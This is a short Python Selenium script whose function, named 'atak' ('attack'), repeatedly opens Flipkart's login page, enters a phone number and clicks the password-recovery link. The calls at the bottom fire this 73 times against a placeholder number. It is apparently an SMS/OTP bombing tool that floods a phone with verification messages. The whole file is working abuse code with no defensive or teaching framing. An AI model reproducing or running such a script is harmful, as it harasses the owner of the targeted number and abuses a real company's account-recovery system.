import time

from selenium import webdriver
from time import sleep

from selenium.webdriver.common.by import By

driver = webdriver.Chrome()


def atak(numer, ilosc=1):
    for i in range(ilosc):
        driver.get("https://www.flipkart.com/account/login?ret=/")
        mobile = driver.find_element(By.XPATH, '//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[1]/input')
        mobile.send_keys(numer)
        forgot = driver.find_element(By.XPATH, '//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[2]/a/span')
        forgot.click()
        time.sleep(2)


atak(1234567890, 10)
atak(1234567890, 6)
atak(1234567890, 3)
atak(1234567890, 2)
atak(1234567890, 7)
atak(1234567890, 4)
atak(1234567890, 3)
atak(1234567890, 5)
atak(1234567890, 3)
atak(1234567890, 10)
atak(1234567890, 10)
atak(1234567890, 10)
